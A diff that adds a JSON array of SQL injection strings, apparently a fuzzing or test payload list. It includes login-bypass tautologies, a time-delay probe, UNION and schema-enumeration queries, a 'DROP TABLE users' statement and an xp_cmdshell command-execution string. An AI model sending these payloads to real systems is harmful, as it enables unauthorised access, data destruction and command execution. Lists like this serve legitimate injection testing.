@@ -1,0 +1,13 @@
+[
+  "' OR 1=1-- ",
+  "\" OR \"\" = \"",
+  "' OR 'x'='x",
+  "' OR SLEEP(5)-- ",
+  "'; DROP TABLE users;-- ",
+  "' UNION SELECT NULL, NULL-- ",
+  "' AND (SELECT COUNT(*) FROM users)>0--",
+  "\" AND 1=(SELECT COUNT(*) FROM information_schema.tables)--",
+  "' OR '1'='1' /*",
+  "'; EXEC xp_cmdshell('dir');--",
+  "' OR EXISTS(SELECT * FROM users)--"
+]
